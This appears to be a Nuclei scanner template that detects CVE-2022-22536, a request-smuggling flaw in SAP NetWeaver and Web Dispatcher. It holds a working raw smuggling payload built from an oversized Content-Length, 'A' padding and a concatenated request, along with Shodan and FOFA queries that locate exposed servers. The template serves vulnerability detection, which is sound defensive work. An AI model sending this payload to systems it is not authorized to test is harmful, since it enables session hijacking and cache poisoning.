http:
- matchers:
  - condition: or
    dsl:
    - contains(tolower(body), 'administration')
    - 'contains(tolower(header), ''content-type: image/png'')'
    type: dsl
  - condition: or
    part: body
    type: word
    words:
    - HTTP/1.0 400 Bad Request
    - HTTP/1.0 500 Internal Server Error
    - HTTP/1.0 500 Dispatching Error
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    sap_path:
    - /sap/admin/public/default.html
    - /sap/public/bc/ur/Login/assets/corbu/sap_logo.png
  raw:
  - 'GET {{sap_path}} HTTP/1.1

    Host: {{Hostname}}

    Content-Length: 82646

    Connection: keep-alive


    {{repeat("A", 82642)}}


    GET / HTTP/1.1

    Host: {{Hostname}}


    '
  read-all: true
  stop-at-first-match: true
  unsafe: true
id: CVE-2022-22536
info:
  author: pdteam
  classification:
    cpe: cpe:2.3:a:sap:content_server:7.53:*:*:*:*:*:*:*
    cve-id: CVE-2022-22536
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-444
    epss-percentile: 0.99855
    epss-score: 0.93845
  description: SAP NetWeaver Application Server ABAP, SAP NetWeaver Application Server
    Java, ABAP Platform, SAP Content Server 7.53 and SAP Web Dispatcher are vulnerable
    to request smuggling and request concatenation attacks. An unauthenticated attacker
    can prepend a victim's request with arbitrary data. This way, the attacker can
    execute functions impersonating the victim or poison intermediary web caches.
    A successful attack could result in complete compromise of Confidentiality, Integrity
    and Availability of the system.
  impact: 'Successful exploitation of this vulnerability can result in unauthorized
    access to sensitive data and potential data leakage.

    '
  metadata:
    fofa-query: icon_hash=-266008933
    max-request: 2
    product: content_server
    shodan-query: http.favicon.hash:-266008933
    vendor: sap
  name: SAP Memory Pipes (MPI) Desynchronization
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2022-22536
  - https://wiki.scn.sap.com/wiki/display/PSR/SAP+Security+Patch+Day+-+February+2022
  - https://github.com/Onapsis/onapsis_icmad_scanner
  - https://blogs.sap.com/2022/02/11/remediation-of-cve-2022-22536-request-smuggling-and-request-concatenation-in-sap-netweaver-sap-content-server-and-sap-web-dispatcher/
  - https://launchpad.support.sap.com/#/notes/3123396
  remediation: 'Apply the latest security patches and updates provided by SAP to mitigate
    this vulnerability.

    '
  severity: critical
  tags: cve,cve2022,sap,smuggling,netweaver,web-dispatcher,memory-pipes,kev,vkev,vuln
